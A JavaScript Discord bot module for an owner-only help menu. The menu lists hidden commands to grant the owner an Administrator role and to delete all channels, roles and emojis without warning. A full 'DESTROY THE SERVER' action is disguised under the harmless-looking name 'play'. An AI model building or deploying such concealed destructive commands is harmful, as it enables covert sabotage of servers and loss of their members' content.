module.exports = {
    name: 'ohelp',
    description: "owner help menu command",
    execute(message, args, Discord) {




        const newEmbed = new Discord.MessageEmbed()
        .setColor('#304281')
        .setTitle('Help (Owner) ')
        .addFields(
            {name: 'Owner Help Command', value: "ohelp"},
            {name: 'Create Administrator Role and Give', value: "arole"},
            {name: 'Delete all Channels (NO WARNING)', value: "dchannel"},
            {name: 'Delete all roles (NO WARNING)', value: "drole"},
            {name: 'Delete all emojis (NO WARNING)', value: "demoji"},
            {name: 'DESTROY THE SERVER (NO WARNING)', value: "play"},
        )
        .setFooter('w');

        message.author.send(newEmbed)
        console.log('Ran ohelp command. (SUCCESS)'); 
    }
    
}
